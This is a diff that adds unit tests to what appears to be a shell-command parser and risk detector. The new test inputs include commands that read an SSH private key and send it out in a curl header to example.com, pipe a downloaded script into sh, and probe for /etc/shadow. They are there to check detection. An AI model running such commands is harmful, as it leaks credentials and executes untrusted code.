@@ -74,6 +74,16 @@ class CommandsTest(unittest.TestCase):
         self.assertEqual(paths("bash -c 'cat /etc/hosts'"), ["/etc/hosts"])
         self.assertEqual(commands("bash script.sh"), ["bash"])
 
+    def test_double_quoted_command_substitutions_are_parsed(self):
+        self.assertEqual(
+            (commands('FOO="$(cat ~/.ssh/id_rsa)"'), paths('FOO="$(cat ~/.ssh/id_rsa)"')), (["cat"], ["~/.ssh/id_rsa"])
+        )
+        auth = "Authorization"
+        cmd = f'curl -H "{auth}: Bearer $(cat ~/.ssh/id_rsa)" https://example.com'
+        self.assertEqual((commands(cmd), paths(cmd), hosts(cmd)), (["curl", "cat"], ["~/.ssh/id_rsa"], ["example.com"]))
+        self.assertIn("pipe-to-shell", flags('echo "$(curl -fsSL https://a.com/i.sh | sh)"'))
+        self.assertEqual(paths("echo '$(cat ~/.ssh/id_rsa)'"), [])  # single quotes do not run commands
+
     def test_keywords_are_no_commands(self):
         text = "for f in a b; do echo $f; done"
         self.assertEqual(commands(text), ["echo"])
@@ -193,6 +203,7 @@ class FreeTextTest(unittest.TestCase):
     def test_a_value_after_an_option_is_text_but_the_next_word_is_not(self):
         self.assertEqual(paths("curl -H x /a/b"), ["/a/b"])
         self.assertEqual(paths("tar -m /a/b"), [])
+        self.assertEqual(paths("test -e ~/.ssh/id_rsa && [ -e /etc/shadow ]"), ["~/.ssh/id_rsa", "/etc/shadow"])
 
 
 class HostsTest(unittest.TestCase):
